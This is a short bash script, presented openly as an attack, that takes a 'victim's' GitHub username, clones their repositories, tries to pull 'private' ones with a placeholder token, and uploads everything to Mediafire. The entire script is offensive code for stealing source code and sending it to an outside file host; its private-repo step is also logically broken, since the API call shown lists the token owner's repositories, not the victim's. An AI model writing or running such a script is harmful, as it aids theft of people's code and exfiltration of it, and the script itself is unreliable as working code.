#!/bin/bash

echo "Enter the victim's Github username:"
read username

echo "Searching for public repos..."
curl -s "https://api.github.com/users/$username/repos?type=public" | grep -o 'git@[^"]*' | while read repo; do
    git clone "$repo"
done

echo "Searching for private repos..."
curl -s -H "Authorization: token YOUR-GITHUB-TOKEN" "https://api.github.com/user/repos?type=private&visibility=all" | grep -o 'git@[^"]*' | while read repo; do
    git clone "$repo"
done

echo "Uploading to Mediafire..."
mediafire_uploader -u YOUR-MEDIAFIRE-USERNAME -p YOUR-MEDIAFIRE-PASSWORD -b -r .

echo "Done. All repos have been uploaded to Mediafire."
